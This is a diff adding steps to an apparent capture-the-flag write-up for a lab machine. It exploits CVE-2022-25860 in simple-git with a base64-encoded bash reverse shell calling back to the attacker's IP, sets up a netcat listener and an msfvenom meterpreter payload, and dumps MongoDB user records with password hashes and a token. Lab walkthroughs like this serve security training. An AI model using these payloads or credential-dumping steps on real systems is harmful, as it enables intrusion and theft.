@@ -132,6 +132,116 @@ decode it with cyberchef:
 
 getting the dev-git-auto-update.chatbot.htb subdomain
 
+in the webpage we discover that it works on simple-git 3.14.0 which have the CVE 2022-25860
+
+generating the reverse shell in revshells.com 
+
+decode it to base 64
+
+to get a reverse shell we will need to execute inside a webpage string:
+    ext::sh -c echo% YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xMjUvNDQ0NCAwPiYx% |% base64% -d% |% bash
+
+launching netcat :
+    rlwrap nc -lnvp 4444
+
+launging and we get the reverse shell
+
+now we need one more reverse shell via meterpreter
+
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.16.125 LPORT=4445 -f elf -o r45
+
+downloading it to machine in /tmp 
+
+and giving it a chmod +x
+
+now we get a reverse shell via meterpreter
+
+going to home directory
+
+in home directory we see directory autmomation
+
+inside it we see a file index.js
+
+inside it:
+
+    import puppeteer from 'puppeteer';
+    import exec from 'child_process'
+
+    function delay(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+    }
+
+    async function remove_messages(){
+    //        console.log("Removing Messages")
+            const command = 'echo "db.messages.remove({})" | mongo testing';
+            exec.exec(command, (error, stdout, stderr) => {
+                if (error) {
+                    console.error(error);
+                } else {
+                    console.log(stdout);
+                }
+            });
+            //  Run after every 30 sec
+            setTimeout(remove_messages,30000)
+    }
+
+
+    async function run() {
+
+    const browser = await puppeteer.launch({
+        args: [
+        '--disable-gpu',
+        '--disable-dev-shm-usage',
+        '--disable-setuid-sandbox',
+        '--no-sandbox',
+        '--disable-accelerated-2d-canvas',
+        '--disable-dev-tools'
+        ],
+        headless: true
+    });
+        const page = await browser.newPage();
+    while (true) {
+        await delay(2000);
+        // Enable cache bypassing
+        await page.goto('http://chatbot.htb/static/index.html', { timeout: 30000 });
+        console.log("Page loaded successfully");
+        await page.type('#email', 'admin@chatbot.htb');
+        await page.type('#password', 'iamnottheadmin$');
+        console.log("Login entered");
+        await page.click('.login-form button[type="submit"]');
+        console.log("Clicked submit");
+        await page.waitForTimeout(4000);
+        await page.setExtraHTTPHeaders({ 'Cache-Control': 'no-cache' });
+        await page.setCacheEnabled(false);
+        await page.goto(page.url(), { timeout: 30000 });
+        console.log("Page reloaded");
+    }
+        await page.close();
+
+    await browser.close();
+    }
+
+    setTimeout(() => {
+    remove_messages().catch(error => console.error(error));
+    }, 0);
+    run().catch(error => console.error(error));
+
+by using netstat we see that there is a mongodb running on port 27017
+
+using command "mongo" to Connect
+
+inside it we use:
+
+show dbs 
+
+after show collections
+
+after db.users.find() to see all the data inside:
+    { "_id" : ObjectId("648874de313b8717284f457c"), "name" : "admin", "email" : "admin@chatbot.htb", "password" : "$2b$10$VSrvhM/5YGM0uyCeEYf/TuvJzzTz.jDLVJ2QqtumdDoKGSa.6aIC.", "terms" : true, "value" : true, "authorization_token" : "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySUQiOiI2NDg4NzRkZTMxM2I4NzE3Mjg0ZjQ1N2MiLCJpYXQiOjE3MTIzNjgzODV9.5FJ3PvMIXo6PHqhaULeU6DTG24oW6ZEjqcy-DfkUCVs", "__v" : 0 }
+    { "_id" : ObjectId("648874de313b8717284f457d"), "name" : "frank_dorky", "email" : "frank_dorky@chatbot.htb", "password" : "$2b$10$hrB/by.tb/4ABJbbt1l4/ep/L4CTY6391eSETamjLp7s.elpsB4J6", "terms" : true, "value" : true, "authorization_token" : " ", "__v" : 0 }
+
+and we get 2 users
+
 
 
 
